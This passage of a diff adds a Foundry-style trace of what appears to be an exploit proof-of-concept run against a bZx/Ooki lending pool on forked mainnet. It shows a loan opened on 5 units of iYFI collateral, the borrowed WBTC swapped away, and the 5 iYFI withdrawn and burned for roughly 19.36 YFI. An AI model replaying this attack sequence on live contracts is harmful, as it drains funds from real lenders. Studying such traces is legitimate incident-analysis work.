+    │   │   │   │   │   │   ├─ [47132] 0x09Ef93750C5F33ab469851F022C1C42056a8BAda::queryRate(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [377] iYFI::loanTokenAddress() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e]
+    │   │   │   │   │   │   │   ├─ [2150] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [1096] AccessControlledOffchainAggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   │   │   ├─ [17612] iYFI::fallback() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [16896] LoanTokenLogicStandard::tokenPrice() [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [13046] bzX::fallback(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [12197] LoanSettings::getTotalPrincipal(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1082] TickMathV1::getSqrtRatioAtTick(-812034 [-8.12e5]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 184785084890 [1.847e11]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   ├─ [541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 19363816309062560436 [1.936e19]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   │   │   ├─ [14592] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [7096] 0x81076d6Ff2620Ea9Dd7bA9c1015f0d09A3A732E6::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 18472498355442635000 [1.847e19]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18472498355442635000 [1.847e19]
+    │   │   │   │   │   │   │   ├─ [425] iYFI::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000a34cf936fd5fd1a0344c00fa284a670000000000000000000000000000000000000000204fce5e3e25026110000000
+    │   │   │   │   │   │   ├─ [29623] 0x09Ef93750C5F33ab469851F022C1C42056a8BAda::getCurrentMargin(WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599], iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 22651422 [2.265e7], 5) [staticcall]
+    │   │   │   │   │   │   │   ├─ [377] iYFI::loanTokenAddress() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e]
+    │   │   │   │   │   │   │   ├─ [2150] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [1096] AccessControlledOffchainAggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   │   │   ├─ [17612] iYFI::fallback() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [16896] LoanTokenLogicStandard::tokenPrice() [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [13046] bzX::fallback(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [12197] LoanSettings::getTotalPrincipal(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1082] TickMathV1::getSqrtRatioAtTick(-812034 [-8.12e5]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 184785084890 [1.847e11]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   ├─ [541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 19363816309062560436 [1.936e19]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   │   │   ├─ [2092] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [1096] 0x81076d6Ff2620Ea9Dd7bA9c1015f0d09A3A732E6::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 18472498355442635000 [1.847e19]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18472498355442635000 [1.847e19]
+    │   │   │   │   │   │   │   ├─ [425] iYFI::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000600a6d4e59ce3a92cf000000000000000000000000000000000000000000462319721942a0542d7b4f
+    │   │   │   │   │   │   ├─  emit topic 0: 0x7bd8cbb7ba34b33004f3deda0fd36c92fc0360acbd97843360037b467a538f90
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000002ffa85f655752fb2acb210287c60b9ef335f5b6e
+    │   │   │   │   │   │   │        topic 3: 0xb6172b3fe11168b42f7273637b7b63b7722b1c68bf07cfeec3781fa983954f2b
+    │   │   │   │   │   │   │           data: 0x0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000007f3fe9d492a9a60aebb06d82cba23c6f32cad10b000000000000000000000000000000000000000000000000000000000159a21e000000000000000000000000000000000000000000000000000000000000000500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000462319721942a0542d7b4f0000000000000000000000000000000000000000000000600a6d4e59ce3a92cf
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x10492ba820fc838011836b6b1978a3a7205f259c5aec0658e89d18488c39ba4c: 0 → 5
+    │   │   │   │   │   │   │   @ 0x4de57d8266953524e2571496bd227dc1d4d0a8e12137eb219c221b054e4064e6: 0 → 0x000000000000000000000000000000000000000000000000d02ab486cedc0000
+    │   │   │   │   │   │   │   @ 0x10492ba820fc838011836b6b1978a3a7205f259c5aec0658e89d18488c39ba51: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │   @ 0x218ff6f9014e65a284f23a3cfbdb4660e5c17196d6a1c733b79eeffca49bb8aa: 0 → 108
+    │   │   │   │   │   │   │   @ 0xf3ebe3e084627c197a8adcabe98790dfac10cd5a66bb42bbb2f93eb83f3c53e2: 0 → 0xb6172b3fe11168b42f7273637b7b63b7722b1c68bf07cfeec3781fa983954f2b
+    │   │   │   │   │   │   │   @ 0x10492ba820fc838011836b6b1978a3a7205f259c5aec0658e89d18488c39ba48: 0 → 0xb6172b3fe11168b42f7273637b7b63b7722b1c68bf07cfeec3781fa983954f2b
+    │   │   │   │   │   │   │   @ 0xbe7ad467fe20c5ba40476de560c62ada9c76dfe4aaec797db4d740434c6ab96b: 0 → 1
+    │   │   │   │   │   │   │   @ 0x16102f891729262ce67210a124a159646f7714794acb4ed5a594ecb524124441: 1 → 2
+    │   │   │   │   │   │   │   @ 0x10492ba820fc838011836b6b1978a3a7205f259c5aec0658e89d18488c39ba50: 0 → 0x000000000000000000000000000000000000000000462319721942a0542d7b4f
+    │   │   │   │   │   │   │   @ 0x10492ba820fc838011836b6b1978a3a7205f259c5aec0658e89d18488c39ba4f: 0 → 0x000000000000000000000000000000000000000000000001158e460913d00000
+    │   │   │   │   │   │   │   @ 0x4de57d8266953524e2571496bd227dc1d4d0a8e12137eb219c221b054e4064e2: 0 → 1
+    │   │   │   │   │   │   │   @ 0xcfa61e979d3501b2c092968cd4788dbba90f3aca69dd429d154ab728caeab2c0: 0 → 0x0000000000000000000000000000000009ee1206a6095d43e2d2e193eec9798f
+    │   │   │   │   │   │   │   @ 0x4de57d8266953524e2571496bd227dc1d4d0a8e12137eb219c221b054e4064e4: 0 → 0x0000000000000000000000007f3fe9d492a9a60aebb06d82cba23c6f32cad10b
+    │   │   │   │   │   │   │   @ 0x10492ba820fc838011836b6b1978a3a7205f259c5aec0658e89d18488c39ba49: 0 → 0x1cde4fcd1465d26b644bfe6520b4ce82d86d80b0a99df2e8aa00a99c65883cbd
+    │   │   │   │   │   │   │   @ 0x0da958bf20d21fd31020c3ce1f4538301c861dfa4e04b63b0a8e4a9959f402a7: 0 → 2
+    │   │   │   │   │   │   │   @ 15: 107 → 108
+    │   │   │   │   │   │   │   @ 0x10492ba820fc838011836b6b1978a3a7205f259c5aec0658e89d18488c39ba52: 0 → 0x0000000000000000000000012ffa85f655752fb2acb210287c60b9ef335f5b6e
+    │   │   │   │   │   │   │   @ 0x4de57d8266953524e2571496bd227dc1d4d0a8e12137eb219c221b054e4064e3: 0 → 0x0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599
+    │   │   │   │   │   │   │   @ 0x518308a18a8c4cc68510c06d02d66d1e1e5096ef0eedde6bbe7c0d563d3e1dd4: 0 → 0xb6172b3fe11168b42f7273637b7b63b7722b1c68bf07cfeec3781fa983954f2b
+    │   │   │   │   │   │   │   @ 0x4de57d8266953524e2571496bd227dc1d4d0a8e12137eb219c221b054e4064e1: 0 → 0x1cde4fcd1465d26b644bfe6520b4ce82d86d80b0a99df2e8aa00a99c65883cbd
+    │   │   │   │   │   │   │   @ 0x4586f8a22b9d78d19d5f90de0a6149748ac78a1411f66a52f853280dda37857d: 0 → 1
+    │   │   │   │   │   │   │   @ 0x10492ba820fc838011836b6b1978a3a7205f259c5aec0658e89d18488c39ba4d: 0 → 0x00000000000000000000000000000000000000000000000000000000656a95e7
+    │   │   │   │   │   │   │   @ 0x4de57d8266953524e2571496bd227dc1d4d0a8e12137eb219c221b054e4064e5: 0 → 0x000000000000000000000000000000000000000000000001158e460913d00000
+    │   │   │   │   │   │   │   @ 0x10492ba820fc838011836b6b1978a3a7205f259c5aec0658e89d18488c39ba4b: 0 → 0x000000000000000000000000000000000000000000000000000000000159a21e
+    │   │   │   │   │   │   │   @ 0x8d1108e10bcb7c27dddfc02ed9d693a074039d026cf4ea4240b40f7d581ac86d: 0 → 0xb6172b3fe11168b42f7273637b7b63b7722b1c68bf07cfeec3781fa983954f2b
+    │   │   │   │   │   │   │   @ 0xa964e3db011f86ad25f6d0db3427543b6fecd491edb73bfe619f4fc199f80687: 0 → 0x000000000000000000000000000000000000000000000000000000000159a21e
+    │   │   │   │   │   │   └─ ← [Return] 0xb6172b3fe11168b42f7273637b7b63b7722b1c68bf07cfeec3781fa983954f2b000000000000000000000000000000000000000000000000000000000159a21e0000000000000000000000000000000000000000000000000000000000000005
+    │   │   │   │   │   └─ ← [Return] 0xb6172b3fe11168b42f7273637b7b63b7722b1c68bf07cfeec3781fa983954f2b000000000000000000000000000000000000000000000000000000000159a21e0000000000000000000000000000000000000000000000000000000000000005
+    │   │   │   │   └─ ← [Return] LoanOpenData({ loanId: 0xb6172b3fe11168b42f7273637b7b63b7722b1c68bf07cfeec3781fa983954f2b, principal: 22651422 [2.265e7], collateral: 5 })
+    │   │   │   └─ ← [Return] LoanOpenData({ loanId: 0xb6172b3fe11168b42f7273637b7b63b7722b1c68bf07cfeec3781fa983954f2b, principal: 22651422 [2.265e7], collateral: 5 })
+    │   │   ├─ [795] WBTC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 22651422 [2.265e7]
+    │   │   ├─ [64174] SushiRouter::swapExactTokensForTokens(22651422 [2.265e7], 0, [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701484107 [1.701e9])
+    │   │   │   ├─ [2517] 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 29767901428 [2.976e10], 5508200841631732803151 [5.508e21], 1701471647 [1.701e9]
+    │   │   │   ├─ [9770] WBTC::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58, 22651422 [2.265e7])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58, value: 22651422 [2.265e7])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x14ac31782b75d0b8926aa44db6f6caf09df8257632d9c607f23247258a0f6d0b: 0x00000000000000000000000000000000000000000000000000000006ee4e20f4 → 0x00000000000000000000000000000000000000000000000000000006efa7c312
+    │   │   │   │   │   @ 0xb7b2d76ffd9913762473e3aba6bedeec6042507b489f25504d98dd2700cec087: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffea65de1
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000000000000000159a21e → 0
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [41087] 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58::swap(0, 4175637839221447271 [4.175e18], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [8062] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4175637839221447271 [4.175e18])
+    │   │   │   │   │   ├─ emit Transfer(from: 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4175637839221447271 [4.175e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x96693869bd9caff1b0916c4e11fe79467174d34d9d4aad910b52d5a6333d2192: 0x00000000000000000000000000000000000000000000012a99a479c3e71b264f → 0x00000000000000000000000000000000000000000000012a5fb1a14621a1cbe8
+    │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000021099f321a741cd7b → 0x0000000000000000000000000000000000000000000000024a8ccb9f6cbb27e2
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [795] WBTC::balanceOf(0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 29790552850 [2.979e10]
+    │   │   │   │   ├─ [534] WETH::balanceOf(0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5504025203792511355880 [5.504e21]
+    │   │   │   │   ├─ emit Sync(reserve0: 29790552850 [2.979e10], reserve1: 5504025203792511355880 [5.504e21])
+    │   │   │   │   ├─ emit Swap(sender: SushiRouter: [0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F], amount0In: 22651422 [2.265e7], amount1In: 0, amount0Out: 0, amount1Out: 4175637839221447271 [4.175e18], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 10: 0x00000000000000000000000000000000000000b1f78392e053094a4e4868cb01 → 0x00000000000000000000000000000000000000b1f8a276f2cff1e9a7f66a62f9
+    │   │   │   │   │   @ 9: 0x00000000000000000000f96b12a4f8e7ceefb4e8a748bdbb9302cb81c7b1a543 → 0x00000000000000000000f97332b9a433f2bdd55f889d86ff02a1347db6d4175b
+    │   │   │   │   │   @ 8: 0x656a659f00000000012a99a479c3e71b264f00000000000000000006ee4e20f4 → 0x656a95e700000000012a5fb1a14621a1cbe800000000000000000006efa7c312
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return] [22651422 [2.265e7], 4175637839221447271 [4.175e18]]
+    │   │   ├─ [105405] bzX::fallback(0xb6172b3fe11168b42f7273637b7b63b7722b1c68bf07cfeec3781fa983954f2b, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5)
+    │   │   │   ├─ [104552] 0x91fcdb277e84642Ef29db708Ff35aA48bA20F04d::withdrawCollateral(0xb6172b3fe11168b42f7273637b7b63b7722b1c68bf07cfeec3781fa983954f2b, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5) [delegatecall]
+    │   │   │   │   ├─ [29194] 0x09Ef93750C5F33ab469851F022C1C42056a8BAda::getMaxDrawdown(WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599], iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 22651422 [2.265e7], 5, 15000000000000000000 [1.5e19]) [staticcall]
+    │   │   │   │   │   ├─ [2092] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   ├─ [1096] 0x81076d6Ff2620Ea9Dd7bA9c1015f0d09A3A732E6::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 18472498355442635000 [1.847e19]
+    │   │   │   │   │   │   └─ ← [Return] 18472498355442635000 [1.847e19]
+    │   │   │   │   │   ├─ [377] iYFI::loanTokenAddress() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e]
+    │   │   │   │   │   ├─ [2150] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   ├─ [1096] AccessControlledOffchainAggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   ├─ [17612] iYFI::fallback() [staticcall]
+    │   │   │   │   │   │   ├─ [16896] LoanTokenLogicStandard::tokenPrice() [delegatecall]
+    │   │   │   │   │   │   │   ├─ [13046] bzX::fallback(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [12197] LoanSettings::getTotalPrincipal(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [1082] TickMathV1::getSqrtRatioAtTick(-812034 [-8.12e5]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 184785084890 [1.847e11]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 19363816309062560436 [1.936e19]
+    │   │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   ├─ [425] iYFI::decimals() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000005
+    │   │   │   │   ├─ [24571] iYFI::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5)
+    │   │   │   │   │   ├─ [23822] LoanTokenLogicStandard::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: bzX: [0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5)
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x16102f891729262ce67210a124a159646f7714794acb4ed5a594ecb524124440: 0 → 5
+    │   │   │   │   │   │   │   @ 0x6d04141ac5829843ee56592e8ca7359578402175753dee6e04e521ddffbc8257: 5 → 0
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit VaultWithdraw(param0: iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 5)
+    │   │   │   │   ├─ [28132] 0x09Ef93750C5F33ab469851F022C1C42056a8BAda::queryRate(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599]) [staticcall]
+    │   │   │   │   │   ├─ [377] iYFI::loanTokenAddress() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e]
+    │   │   │   │   │   ├─ [2150] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   ├─ [1096] AccessControlledOffchainAggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   ├─ [17612] iYFI::fallback() [staticcall]
+    │   │   │   │   │   │   ├─ [16896] LoanTokenLogicStandard::tokenPrice() [delegatecall]
+    │   │   │   │   │   │   │   ├─ [13046] bzX::fallback(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [12197] LoanSettings::getTotalPrincipal(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [1082] TickMathV1::getSqrtRatioAtTick(-812034 [-8.12e5]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 184785084890 [1.847e11]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 19363816309062560436 [1.936e19]
+    │   │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   ├─ [2092] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   ├─ [1096] 0x81076d6Ff2620Ea9Dd7bA9c1015f0d09A3A732E6::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 18472498355442635000 [1.847e19]
+    │   │   │   │   │   │   └─ ← [Return] 18472498355442635000 [1.847e19]
+    │   │   │   │   │   ├─ [425] iYFI::decimals() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000a34cf936fd5fd1a0344c00fa284a670000000000000000000000000000000000000000204fce5e3e25026110000000
+    │   │   │   │   ├─  emit topic 0: 0x6fdb66f06832f41be9e4313f93e9b50685b11f2540d275342262997f35da8810
+    │   │   │   │   │        topic 1: 0xb6172b3fe11168b42f7273637b7b63b7722b1c68bf07cfeec3781fa983954f2b
+    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000001945019d0000000000000000000000000000000000000000000000000000000000000005
+    │   │   │   │   ├─  emit topic 0: 0x7b1bab051266a4a36232da9b4341daf225fa42f7202b0e7207b9b502644ff1bb
+    │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │        topic 2: 0x0000000000000000000000007f3fe9d492a9a60aebb06d82cba23c6f32cad10b
+    │   │   │   │   │        topic 3: 0xb6172b3fe11168b42f7273637b7b63b7722b1c68bf07cfeec3781fa983954f2b
+    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000005
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x10492ba820fc838011836b6b1978a3a7205f259c5aec0658e89d18488c39ba4c: 5 → 0
+    │   │   │   │   └─ ← [Return] 5
+    │   │   │   └─ ← [Return] 5
+    │   │   ├─ [531] iYFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 5
+    │   │   ├─ [65282] iYFI::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5)
+    │   │   │   ├─ [64533] LoanTokenLogicStandard::burn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5) [delegatecall]
+    │   │   │   │   ├─ [17635] bzX::fallback(0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [16797] 0xaECAD4373Dc7fD95c37cb56446B8DD9dD1394811::settleInterest(0x0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   │   ├─ [1601] 0x6Ae6CECaa083F7245abf8F96e79d338C6fB297fA::getTickAtSqrtRatio(100000000000000000 [1e17]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] -547992 [-5.479e5]
+    │   │   │   │   │   │   ├─ [1082] 0x6Ae6CECaa083F7245abf8F96e79d338C6fB297fA::getSqrtRatioAtTick(-812034 [-8.12e5]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 184785084890 [1.847e11]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ [2538] bzX::fallback(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   ├─ [1727] LoanSettings::getPoolPrincipalStored(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 19363816309062560436 [1.936e19]
+    │   │   │   │   ├─ [541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 19363816309062560436 [1.936e19]
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 5)
+    │   │   │   │   ├─ emit Burn(burner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenAmount: 5, assetAmount: 19363816309062560436 [1.936e19], price: 3872763261812512087200000000000000000 [3.872e36])
+    │   │   │   │   ├─ [23352] YFI::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19363816309062560436 [1.936e19])
+    │   │   │   │   │   ├─ emit Transfer(from: iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 19363816309062560436 [1.936e19])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x7c940df096504eaad90733b4c77033f7fadb8d304b63a0626b28983c613c695f: 0x0000000000000000000000000000000000000000000000010cba1856d596eab4 → 0
+    │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x0000000000000000000000000000000000000000000000010cba1856d596eab4
